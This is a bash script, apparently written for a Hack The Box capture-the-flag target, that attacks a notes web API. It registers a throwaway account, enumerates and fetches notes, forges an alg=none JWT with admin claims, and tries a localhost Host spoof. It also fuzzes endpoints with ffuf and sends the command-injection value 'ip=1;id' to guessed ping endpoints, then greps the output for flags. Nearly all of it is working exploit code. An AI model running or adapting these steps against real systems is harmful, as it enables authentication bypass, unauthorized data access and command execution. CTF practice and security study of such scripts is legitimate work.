#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
PORT=${2:?PORT}
TO=${3:-8}
BASE_OUT=${4:-/workspace/recon/httpx}
OUT_DIR="$BASE_OUT/${IP}_${PORT}"
mkdir -p "$OUT_DIR"
API_BASE="http://$IP:$PORT"
WL_API="/workspace/recon/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt"
WL_ROOT="/workspace/recon/wordlists/seclists/Discovery/Web-Content/common.txt"
# 1) Register + login fresh
E=$(date +%s)
EMAIL="a${E}@a.com"; PASS="a"
jq -n --arg email "$EMAIL" --arg password "$PASS" '{email:$email,password:$password}' > "$OUT_DIR/creds.json"
curl -fsS -m 12 --connect-timeout 8 -H 'Content-Type: application/json' -d @"$OUT_DIR/creds.json" "$API_BASE/api/auth/register" > "$OUT_DIR/register.json" || true
curl -fsS -m 12 --connect-timeout 8 -H 'Content-Type: application/json' -d @"$OUT_DIR/creds.json" "$API_BASE/api/auth/login" > "$OUT_DIR/login.json"
TOKEN=$(jq -r .token "$OUT_DIR/login.json")
printf '%s' "$TOKEN" > "$OUT_DIR/token.txt"
# 2) Verify and list notes
curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" "$API_BASE/api/auth/verify" > "$OUT_DIR/verify.json" || true
curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" --path-as-is "$API_BASE/api/notes?all=1" -i > "$OUT_DIR/notes_all1.head" || true
awk 'f{print} /^$/{f=1}' "$OUT_DIR/notes_all1.head" > "$OUT_DIR/notes_all1.json" || true
# 3) Fetch each note content if list exists
if jq -e '.notes|type=="array"' "$OUT_DIR/notes_all1.json" >/dev/null 2>&1; then
  jq -r '.notes[].id' "$OUT_DIR/notes_all1.json" > "$OUT_DIR/note_ids.txt"
  while read -r nid; do
    [ -z "$nid" ] && continue
    curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" "$API_BASE/api/notes/$nid" > "$OUT_DIR/note_${nid}.json" || true
  done < "$OUT_DIR/note_ids.txt"
fi
# 4) Forge alg=none admin token and try /api/notes/all
NONE=$(python3 - <<'PY'
import json,base64,time
login=json.load(open('LOGIN'))
h,p,_=login['token'].split('.')
now=int(time.time())
payload={'id':'00000000-0000-0000-0000-000000000001','email':'admin@local','iat':now,'exp':now+3600,'role':'admin','isAdmin':True}
hb=base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
pb=base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).decode().rstrip('=')
print(hb+'.'+pb+'.')
PY
LOGIN="$OUT_DIR/login.json")
curl -fsS -m "$TO" --connect-timeout "$TO" -i -H "Authorization: Bearer $NONE" "$API_BASE/api/notes/all" > "$OUT_DIR/notes_all_none.head" || true
# 5) Try Host/resolve spoof with NONE
curl -fsS -m "$TO" --connect-timeout "$TO" --resolve "localhost:$PORT:$IP" -i -H "Authorization: Bearer $NONE" "http://localhost:$PORT/api/notes/all" > "$OUT_DIR/res_localhost_notes_all_none.head" || true
# 6) FFUF root and /api for ping endpoints (no timeout per rules)
ffuf -w "$WL_ROOT" -u "$API_BASE/FUZZ" -maxtime 0 -timeout 0 -ac -mc all -of json -o "$OUT_DIR/ffuf_root.json" || true
ffuf -w "$WL_API" -u "$API_BASE/api/FUZZ" -maxtime 0 -timeout 0 -ac -mc all -of json -o "$OUT_DIR/ffuf_api.json" || true
# 7) Probe potential ping-like endpoints found from wordlists
for cand in ping ping-ip check pingip health; do
  # GET
  curl -fsS -m "$TO" --connect-timeout "$TO" -i "$API_BASE/$cand" > "$OUT_DIR/p_${cand}.head" || true
  # POST injection
  curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode 'ip=1;id' "$API_BASE/$cand" > "$OUT_DIR/p_${cand}_inj.txt" || true
done
# 8) Search HTB in outputs
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR" > "$OUT_DIR/htb_hits.txt" || true
sed -n '1,200p' "$OUT_DIR/htb_hits.txt" || true
